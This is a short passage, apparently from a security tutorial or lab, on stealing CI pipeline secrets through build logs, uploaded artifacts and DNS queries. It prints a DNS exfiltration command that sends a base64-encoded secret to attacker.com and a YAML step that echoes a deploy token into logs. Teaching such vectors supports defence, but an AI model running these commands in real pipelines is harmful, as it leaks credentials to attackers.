CI secrets are just environment variables. Any step in the pipeline can
read them. There are three common exfiltration vectors:

1. **Build logs**: `echo $SECRET_TOKEN` where the value appears in the log output
2. **Artifacts**: Write secrets to a file, upload as build artifact
3. **DNS exfil**: `dig $(echo $SECRET | base64).attacker.com`, where data
   is encoded in the DNS query itself

Try each technique in the CI config:

```yaml
- name: Exfil via logs
  run: echo "Token is $DEPLOY_TOKEN"
```
